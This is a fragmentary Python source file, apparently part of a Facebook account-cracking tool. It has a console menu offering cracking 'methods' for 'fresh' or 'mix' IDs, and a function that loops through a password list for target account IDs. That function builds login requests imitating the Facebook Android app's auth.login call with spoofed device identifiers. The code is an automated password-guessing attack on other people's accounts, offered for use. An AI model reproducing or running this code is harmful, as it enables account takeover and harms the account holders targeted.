                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' All Method Update Check One by One  ')
                                linex()
                                print(' [1] Method 1 (For Fresh Id) \n [2] Method 2 (For Mix ID )')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
...
def api2(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':'ec8b9dd5-0cb5-4e4b-9d39-256d36680f21',
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        ...
                                        'device_id':'ed55e6a4-5425-407c-95f7-045e027f76a4',
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
